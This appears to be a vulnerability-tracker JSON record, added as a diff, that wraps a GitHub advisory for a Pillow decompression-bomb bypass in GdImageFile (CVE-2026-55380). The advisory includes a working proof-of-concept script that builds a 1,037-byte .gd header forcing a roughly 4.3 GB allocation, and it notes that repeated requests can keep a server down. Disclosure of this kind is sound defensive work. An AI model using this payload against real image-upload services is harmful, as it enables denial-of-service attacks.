@@ -1,0 +1,57 @@
+{
+  "ai": {
+    "affected_assets": [],
+    "evidence_urls": [],
+    "exposure_conditions": [],
+    "recommended_actions": [],
+    "status": "pending",
+    "uncertainties": []
+  },
+  "body_excerpt": "{\"credits\": [{\"type\": \"reporter\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/223256873?v=4\", \"events_url\": \"https://api.github.com/users/x-forwarded-sudo/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/x-forwarded-sudo/followers\", \"following_url\": \"https://api.github.com/users/x-forwarded-sudo/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/x-forwarded-sudo/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/x-forwarded-sudo\", \"id\": 223256873, \"login\": \"x-forwarded-sudo\", \"node_id\": \"U_kgDODU6hKQ\", \"organizations_url\": \"https://api.github.com/users/x-forwarded-sudo/orgs\", \"received_events_url\": \"https://api.github.com/users/x-forwarded-sudo/received_events\", \"repos_url\": \"https://api.github.com/users/x-forwarded-sudo/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/x-forwarded-sudo/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/x-forwarded-sudo/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/x-forwarded-sudo\", \"user_view_type\": \"public\"}}], \"cve_id\": \"CVE-2026-55380\", \"cvss\": {\"score\": 7.5, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H\"}, \"cvss_severities\": {\"cvss_v3\": {\"score\": 7.5, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H\"}, \"cvss_v4\": {\"score\": 0.0, \"vector_string\": null}}, \"cwes\": [{\"cwe_id\": \"CWE-789\", \"name\": \"Memory Allocation with Excessive Size Value\"}], \"description\": \"## Description\\n\\n`PIL/GdImageFile.py` `GdImageFile._open()` reads image dimensions from the GD 2.x header and stores them in `self._size` without calling `Image._decompression_bomb_check()`. Because `GdImageFile` is **not registered with `Image.register_open()`**, it never passes through the standard `Image.open()` code path that enforces Pillow's decompression bomb guard. The plugin exposes its own entry point — `PIL.GdImageFile.open(fp)` — which directly instantiates the class, fully bypassing the documented protection.\\n\\n**Vulnerable code (`PIL/GdImageFile.py` lines 50–61):**\\n\\n```python\\ndef _open(self) -> None:\\n    s = self.fp.read(1037)\\n    if i16(s) not in [65534, 65535]:\\n        raise SyntaxError(\\\"Not a valid GD 2.x .gd file\\\")\\n    self._mode = \\\"P\\\"\\n    self._size = i16(s, 2), i16(s, 4)   # ← unsigned 16-bit; max 65535 each\\n    # NO _decompression_bomb_check() call here ←\\n    ...\\n    self.tile = [ImageFile._Tile(\\\"raw\\\", (0, 0) + self.size, 1037, \\\"L\\\")]\\n```\\n\\nWhen `load()` is subsequently called on the returned image object:\\n\\n```python\\nload() → load_prepare() → Image.core.new(\\\"P\\\", (65535, 65535))\\n# ↑ C-level allocation of 4,294,836,225 bytes ≈ 4.3 GB — no Python bomb check precedes this\\n```\\n\\n**Dimension arithmetic:**\\n\\n| Field | Value |\\n|---|---|\\n| Maximum width from header | 65,535 (unsigned 16-bit) |\\n| Maximum height from header | 65,535 (unsigned 16-bit) |\\n| Maximum pixel count | 65,535 × 65,535 = **4,294,836,225** |\\n| `DecompressionBombError` threshold | 178,956,970 (2 × MAX_IMAGE_PIXELS) |\\n| **Overshoot ratio** | **24× above DecompressionBombError threshold** |\\n| Memory at max dimensions | **≈ 4.3 GB** (palette-mode: 1 byte/pixel) |\\n| Minimum attack file size | **1,037 bytes** (header only — no pixel data needed) |\\n\\n**Comparison with safe sibling plugin (`WalImageFile`):**\\n\\n`WalImageFile` is in the same category — not registered with `Image.open()`, loaded via its own `open()` helper. It was previously patched with the correct fix:\\n\\n```python\\n# PIL/WalImageFile.py line 46 — CORRECT pattern (already patched)\\nself._size = i32(header, 32), i32(header, 36)\\nImage._decompression_bomb_check(self.size)   # ← present\\n```\\n\\n`GdImageFile` was never updated to match, leaving a gap in protection.\\n\\n## Steps to reproduce\\n\\n**Proof of Concept script:**\\n\\n```python\\n#!/usr/bin/env python3\\n\\\"\\\"\\\"\\nPoC: GdImageFile decompression bomb bypass\\n1037-byte crafted .gd file → 4.3 GB C-heap allocation, NO bomb check\\n\\\"\\\"\\\"\\nimport io, struct\\nfrom PIL import GdImageFile, Image\\n\\n# Build minimal 1037-byte GD 2.x palette-mode header:\\n#   sig(2) + width(2) + height(2) + true_color(1) + tindex(4) + colors_used(2) + palette(1024)\\nsig          = struct.pack(\\\">H\\\", 0xFFFE)       # 65534 = GD 2.x magic\\nw            = struct.pack(\\\">H\\\", 65535)         # max width\\nh            = struct.pack(\\\">H\\\", 65535)         # max height\\ntrue_color   = b\\\"\\\\x00\\\"                          # 0 = palette mode\\ntindex       = struct.pack(\\\">I\\\", 0xFFFFFFFF)    # > 255 = no transparency\\ncolors_used  = b\\\"\\\\x00\\\\x00\\\"\\npalette_data = b\\\"\\\\x00\\\" * 1024\\nheader = sig + w + h + true_color + tindex + colors_used + palette_data\\nassert len(header) == 1037\\n\\n# Confirm: standard Image.open() path BLOCKS this size\\ntry:\\n    Image._decompression_bomb_check((65535, 65535))\\nexcept Image.DecompressionBombError as e:\\n    print(f\\\"[BLOCKED] Image.open() path: {e}\\\")\\n\\n# Vulnerable path: GdImageFile.open() has NO bomb check\\nimg = GdImageFile.open(io.BytesIO(header))\\nprint(f\\\"[BYPASS] GdImageFile.open() succeeded: size={img.size}, mode={img.mode}\\\")\\nprint(f\\\"         No _decompression_bomb_check called — 4.3 GB allocation not blocked\\\")\\n\\n# Trigger load_prepare() → Image.core.new(\\\"P\\\", (65535, 65535))\\ntry:\\n    img.load()\\nexcept OSError:\\n    print(f\\\"[INFO]   load() OSError (no pixel data) — but C-heap allocation already attempted\\\")\\n\\nprint(f\\\"\\\\n[MATH]   {65535 * 65535:,} pixels = {65535*65535 / (Image.MAX_IMAGE_PIXELS*2):.1f}× error threshold\\\")\\nprint(f\\\"[MATH]   Attack file: 1,037 bytes only\\\")\\n```\\n\\n**Expected output:**\\n```\\n[BLOCKED] Image.open() path: Image size (4294836225 pixels) exceeds limit of 178956970\\npixels, could be decompression bomb DOS attack.\\n[BYPASS] GdImageFile.open() succeeded: size=(65535, 65535), mode=P\\n         No _decompression_bomb_check called — 4.3 GB allocation not blocked\\n[INFO]   load() OSError (no pixel data) — but C-heap allocation already attempted\\n\\n[MATH]   4,294,836,225 pixels = 24.0× error threshold\\n[MATH]   Attack file: 1,037 bytes only\\n```\\n\\n**Verified live on Pillow 12.2.0.**\\n\\n**Two attack paths:**\\n\\n| Path | File size | Effect |\\n|---|---|---|\\n| Transient (header only) | **1,037 bytes** | `load_prepare()` attempts 4.3 GB C allocation → `OSError` after spike |\\n| Persistent (full pixel data) | ~4.3 GB | `load()` completes, 4.3 GB stays in memory for object lifetime |\\n\\nFor the transient path, a 1,037-byte file is all that is needed. The attacker does not need to upload a large file.\\n\\n**Real-world scenario:**\\n```python\\nfrom PIL import GdImageFile\\n\\n# Application accepts user-uploaded .gd files\\nimg = GdImageFile.open(user_uploaded_file)   # succeeds — no bomb check\\nimg.load()                                    # triggers 4.3 GB C-heap allocation\\n```\\n\\n## Impact\\n\\n- **Availability:** HIGH — a single 1,037-byte malicious `.gd` file causes the host process to attempt a ~4.3 GB C-heap allocation. On systems with insufficient memory this crashes the process. Repeatable — attacker can loop requests to keep the server down.\\n- **Confidentiality:** None\\n- **Integrity:** None\\n- **Authentication required:** No — any public endpoint accepting image uploads is affected\\n- **User interaction:** None\\n\\nAny service that calls `PIL.GdImageFile.open(user_file)` followed by `.load()` (or any lazy-load trigger) is vulnerable. Because the attack requires only a 1,037-byte file, network bandwidth is not a constraint.\\n\\nConfirmed unpatched on `python-pillow/Pillow` `main` branch as of 2026-06-08.\", \"epss\": {\"percentage\": 0.00361, \"percentile\": 0.28131}, \"ghsa_id\": \"GHSA-phj9-mv4w-65pm\", \"github_reviewed_at\": \"2026-07-20T21:13:35Z\", \"html_url\": \"https://github.com/advisories/GHSA-phj9-mv4w-65pm\", \"identifiers\": [{\"type\": \"GHSA\", \"value\": \"GHSA-phj9-mv4w-65pm\"}, {\"type\": \"CVE\", \"value\": \"CVE-2026-55380\"}], \"nvd_published_at\": \"2026-07-06T19:17:08Z\", \"published_at\": \"2026-07-20T21:13:35Z\", \"references\": [\"https://github.com/python-pillow/Pillow/security/advisories/GHSA-phj9-mv4w-65pm\", \"https://nvd.nist.gov/vuln/detail/CVE-2026-55380\", \"https://github.com/python-pillow/Pillow/commit/f39b0ae6624eb2d7c5c5d651d9bb5fdbd96a8675\", \"https://github.com/pypa/advisory-database/tree/main/vulns/pillow/PYSEC-2026-2256.yaml\", \"https://github.com/python-pillow/Pillow/blob/main/docs/releasenotes/12.3.0.rst\", \"https://github.com/advisories/GHSA-phj9-mv4w-65pm\"], \"repository_advisory_url\": \"https://api.github.com/repos/python-pillow/Pillow/security-advisories/GHSA-phj9-mv4w-65pm\", \"severity\": \"high\", \"source_code_location\": \"https://github.com/python-pillow/Pillow\", \"summary\": \"Pillow `GdImageFile._open()`: image dimensions accepted without `_decompression_bomb_check()`\", \"type\": \"reviewed\", \"updated_at\": \"2026-07-20T21:13:38Z\", \"url\": \"https://api.github.com/advisories/GHSA-phj9-mv4w-65pm\", \"vulnerabilities\": [{\"first_patched_version\": \"12.3.0\", \"package\": {\"ecosystem\": \"pip\", \"name\": \"pillow\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \"< 12.3.0\"}], \"withdrawn_at\": null}",
+  "canonical_id": "github:ghsa-phj9-mv4w-65pm",
+  "decision": {
+    "priority": "INFO",
+    "reasons": [
+      "資産不一致または判定情報不足"
+    ]
+  },
+  "enrichment": {
+    "asset_match": false,
+    "cisa_kev": false,
+    "internet_exposed": false,
+    "matched_asset_ids": []
+  },
+  "facts": {
+    "affected_versions": [
+      "pillow: < 12.3.0"
+    ],
+    "authentication_required": false,
+    "cves": [
+      "CVE-2026-55380"
+    ],
+    "cvss_score": 7.5,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+    "fixed_versions": [],
+    "mitigations": [],
+    "products": [
+      "pillow"
+    ],
+    "remote": true,
+    "vendor_severity": "high"
+  },
+  "first_seen_at": "2026-07-22T00:50:30.509247Z",
+  "provenance": {
+    "content_sha256": "b757bf0afda4cc8399e300cc7c6e9cd266bf4fa99a16af149c3528987d606c63",
+    "extractor_version": "0.1.0",
+    "source_type": "json_api"
+  },
+  "published_at": "2026-07-20T21:13:35Z",
+  "schema_version": 1,
+  "source_id": "github_advisory_database",
+  "source_url": "https://github.com/advisories/GHSA-phj9-mv4w-65pm",
+  "status": "active",
+  "title": "Pillow `GdImageFile._open()`: image dimensions accepted without `_decompression_bomb_check()`",
+  "updated_at": "2026-07-20T21:13:38Z",
+  "vendor": "GitHub",
+  "vendor_advisory_id": "GHSA-phj9-mv4w-65pm"
+}
